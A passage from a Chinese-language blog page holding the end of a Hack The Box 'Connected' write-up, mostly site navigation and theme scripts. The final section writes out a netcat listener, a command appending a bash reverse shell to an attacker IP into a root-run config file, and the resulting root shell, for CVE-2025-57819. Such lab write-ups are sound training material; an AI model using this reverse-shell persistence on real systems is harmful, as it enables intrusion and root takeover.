+</span></span></code></pre></div><h3 id="go">
+<a class="header-anchor" href="#go"></a>
+go
+</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#监听端口</span>
+</span></span><span class="line"><span class="cl">	nc -lvvp <span class="m">999</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#插入反弹shell</span>
+</span></span><span class="line"><span class="cl">	<span class="nb">echo</span> <span class="s1">&#39;bash -c &#34;bash -i &gt;&amp; /dev/tcp/10.10.17.50/999 0&gt;&amp;1&#34; &amp;&#39;</span> &gt;&gt; /etc/dahdi/init.conf
+</span></span><span class="line"><span class="cl"><span class="c1">#修改文件触发</span>
+</span></span><span class="line"><span class="cl">	<span class="nb">echo</span> <span class="s2">&#34;haha&#34;</span> &gt; /var/spool/asterisk/sysadmin/dahdi_restart
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#获取root权限</span>
+</span></span><span class="line"><span class="cl">	<span class="o">[</span>root@connected /<span class="o">]</span><span class="c1"># id</span>
+</span></span><span class="line"><span class="cl">        id
+</span></span><span class="line"><span class="cl">        <span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>	
+</span></span></code></pre></div><p>内容参考文章：https://www.ashirrana.app/article/connected-writeup-hackthebox   ，针对CVE-2025-57819的利用原理和过程，该文章有更详细的描述。</p>
+</div>
+    <footer class="article-footer"><ul class="article-category-list"><li class="article-tag-list-item" data-aos="zoom-in">
+    <a
+      class="article-category-link"
+      href="/categories/htb"
+      data-aos="zoom-in"
+      >HTB</a
+    >
+    </li></ul>
+<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in">
+      <a
+        class="article-tag-list-link"
+        href="/tags/htb"
+        rel="tag"
+        >htb</a
+      >
+    </li></ul>
+</footer>
+  </div><nav
+    id="article-nav"
+    aria-label="Article navigation"
+    data-aos="fade-up"
+  ><div class="article-nav-link-wrap left"><img
+              data-src="https://d-sketon.top/img/_backwebp/bg25.webp"
+              data-sizes="auto"
+              alt="htb-cap"
+              class="lazyload"
+            /><a
+          href="/post/htb/htb%E6%89%93%E9%9D%B6-cap/"
+          aria-label="前一篇:htb-cap"
+          title="前一篇:htb-cap"
+        ></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">htb-cap</h3>
+      </div></nav></article></section>
+        </div><footer id="footer" aria-label="Site footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info"><div>
+      <span class="icon-copyright"></span>2020-2026<span class="footer-info-sep rotate"></span>L
+    </div><div>
+        基于&nbsp;<a
+          href="https://gohugo.io/"
+          target="_blank"
+          rel="noopener nofollow noreferrer"
+          >Hugo</a
+        >&nbsp;Theme.<a
+          href="https://github.com/D-Sketon/hugo-theme-reimu"
+          target="_blank"
+          rel="noopener nofollow noreferrer"
+          >Reimu</a
+        >
+      </div><div>
+        <span class="icon-brush"
+          >&nbsp;113.0k</span
+        >
+        &nbsp;|&nbsp;
+        <span class="icon-coffee">&nbsp;04:32</span>
+      </div><div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv"
+          >总访问量&nbsp;<span
+            id="busuanzi_value_site_pv"
+          ></span
+        ></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv"
+          >总访客量&nbsp;<span
+            id="busuanzi_value_site_uv"
+          ></span
+        ></span>
+      </div></div>
+</footer>
+<div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div><div id="mask" class="hide"></div>
+      </div><nav id="mobile-nav" aria-label="Mobile navigation">
+  <div class="sidebar-wrap"><div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class">
+  <nav id="TableOfContents">
+  <ul>
+    <li><a href="#端口枚举">端口枚举</a></li>
+    <li><a href="#web信息枚举">WEB信息枚举</a></li>
+    <li><a href="#权限提升">权限提升</a>
+      <ul>
+        <li><a href="#必备知识">必备知识</a></li>
+        <li><a href="#攻击链路梳理">攻击链路梳理</a></li>
+        <li><a href="#go">go</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+</div></div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img
+    data-src="/avatar/avatar.webp"
+    data-sizes="auto"
+    alt="L"
+    class="lazyload"
+  />
+  <div class="sidebar-author-name">L</div>
+  <div class="sidebar-description">少女祈祷中...</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div><div class="sidebar-state-number">87</div>
+  </div>
+  <a class="sidebar-state-category" href="/categories/" aria-label="sidebar-state-category-link">
+    <div>分类</div>
+    <div class="sidebar-state-number">
+      16
+    </div>
+  </a>
+  <a class="sidebar-state-tag" href="/tags/" aria-label="sidebar-state-tag-link">
+    <div>标签</div>
+    <div class="sidebar-state-number">22</div>
+  </a>
+</div>
+<div class="sidebar-social" ><div class="icon-email sidebar-social-icon">
+      <a
+        href="#ZgotmplZ"
+        itemprop="url"
+        target="_blank"
+        aria-label="email"
+        rel="noopener nofollow noreferrer"
+      ></a>
+    </div></div><div class="sidebar-menu"><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/"
+        aria-label="首页"
+      ></a><div class='sidebar-menu-icon icon rotate'>&#xe62b;</div><div class="sidebar-menu-link">首页</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/archives"
+        aria-label="归档"
+      ></a><div class='sidebar-menu-icon icon rotate'>&#xe62b;</div><div class="sidebar-menu-link">归档</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/about"
+        aria-label="关于"
+      ></a><div class='sidebar-menu-icon icon rotate'>&#xe62b;</div><div class="sidebar-menu-link">关于</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/other_site"
+        aria-label="常用网站"
+      ></a><div class='sidebar-menu-icon icon rotate'>&#xe62b;</div><div class="sidebar-menu-link">常用网站</div>
+    </div></div></div></div><div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div></nav>
+</div><script
+    src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js"
+    
+    
+    
+    
+    integrity="sha384-3gT/vsepWkfz/ff7PpWNUeMzeWoH3cDhm/A8jM7ouoAK0/fP/9bcHHR5kHq2nf&#43;e" crossorigin="anonymous"></script><script
+    src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js"
+    
+    
+    
+    
+    integrity="sha384-J08i8An/QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script><script src="/js/main.js" integrity="" crossorigin="anonymous"  ></script><script src="/js/aos.js" integrity="" crossorigin="anonymous"  ></script><script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === "loading") {
+      document.addEventListener("DOMContentLoaded", aosInit);
+    } else {
+      aosInit();
+    }
+  </script><script src="/js/pjax_main.js" integrity="" crossorigin="anonymous" data-pjax ></script><script>
+  var setupFirework = () => {
+    if (! false  || !window.matchMedia('(max-width: 768px)').matches) {
+      if (window.firework) {
+        const options = JSON.parse("{\"excludeelements\":[\"a\",\"button\"],\"particles\":[{\"colors\":[\"var(--red-1)\",\"var(--red-2)\",\"var(--red-3)\",\"var(--red-4)\"],\"duration\":[1200,1800],\"easing\":\"easeOutExpo\",\"move\":[\"emit\"],\"number\":20,\"shape\":\"circle\",\"shapeOptions\":{\"alpha\":[0.3,0.5],\"radius\":[16,32]}},{\"colors\":[\"var(--red-0)\"],\"duration\":[1200,1800],\"easing\":\"easeOutExpo\",\"move\":[\"diffuse\"],\"number\":1,\"shape\":\"circle\",\"shapeOptions\":{\"alpha\":[0.2,0.5],\"lineWidth\":6,\"radius\":20}}]}");
+        options.excludeElements = options.excludeelements;
+        delete options.excludeelements;
+        window.firework(options);
+      }
+    }
+  }
+</script><script
+    src="https://npm.webcache.cn/mouse-firework@0.2.0/dist/index.umd.js"
+    defer
+    
+    
+    onload="setupFirework()"
+    integrity="sha384-qi9WggRt19tv8Vc7pCHW3ulMNLwrn515zaLEWZjl1px07vz8&#43;pUoWX8n1rgq282T" crossorigin="anonymous"></script><script>
+  var setupLive2d = () => {
+    live2d.init('https:\/\/fastly.jsdelivr.net\/gh\/D-Sketon\/plugin-live2d\/', {themeTipsPath: ""});
+  }
+</script><script
+    src="https://test692618.github.io/"
+    
+    async
+    
+    onload="setupLive2d()"
+    ></script>
+
+<div id="lazy-script">
+  <div><script data-pjax>
+        window.REIMU_POST = {
+          author: "L",
+          title: "htb-Connected",
+          url: "https:\/\/test692618.github.io\/post\/htb\/htb%E6%89%93%E9%9D%B6-connected\/",
+          description: " 端口枚举 ports=$(nmap --top-ports=1000 --min-rate=1000 -Pn -T4 $ip | grep \u0026#39;^[0-9]\u0026#39; | cut -d \u0026#39;\/\u0026#39; -f 1 | tr \u0026#39;\\n\u0026#39; \u0026#39;,\u0026#39; | sed s\/,$\/\/) nmap -p $ports -Pn -sC -sV $ip ----- PORT STATE SERVICE VERSION 22\/tcp open ssh OpenSSH 7.4 (protocol 2.0) | ssh-hostkey: | 2048 …",
+          cover: "https:\/\/test692618.github.io\/images\/banner.webp",
+        };
+      </script><script src="/js/insert_highlight.js" integrity="" crossorigin="anonymous" data-pjax ></script><script src="/js/tabs.js" integrity="" crossorigin="anonymous" data-pjax defer></script><script type="module" data-pjax>const PhotoSwipeLightbox = (await safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe-lightbox.esm.min.js", "sha384-DiL6M\/gG\u002bwmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF\/N6lrZi\/")).default;const initPswp = (gallery, children) => {
+          if (_$$(`${gallery} ${children}`).length > 0) {
+            new PhotoSwipeLightbox({
+              gallery,
+              children,pswpModule: () => safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8\u002boTJ7m3DfYEWX1fu1scuS4\u002bs")}).init();
+          }
+        }
+        const pswp = () => {
+          initPswp('.article-entry', 'a.article-gallery-item');
+          initPswp('.article-gallery', 'a.article-gallery-item');
+        }
+        pswp()
+      </script></div>
+</div><script
+    src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js"
+    
+    async
+    
+    
+    integrity="sha384-0M75wtSkhjIInv4coYlaJU83&#43;OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id&#43;S" crossorigin="anonymous"></script><script>
+    if ('serviceWorker' in navigator) {
+      navigator.serviceWorker.getRegistrations().then((registrations) => {
+        for (let registration of registrations) {
+          registration.unregister();
+        }
+      });
+    }
+  </script><script>
+  const reimuCopyright = String.raw`
+   ______     ______     __     __    __     __  __    
+  /\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+  \ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+   \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+    \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                    
+  `;
+  console.log(String.raw`%c ${reimuCopyright}`, "color: #ff5252;");
+  console.log(
+    "%c Theme.Reimu" + " %c https://github.com/D-Sketon/hugo-theme-reimu ",
+    "color: white; background: #ff5252; padding:5px 0;",
+    "padding:4px;border:1px solid #ff5252;",
+  );
+</script></body>
+</html>
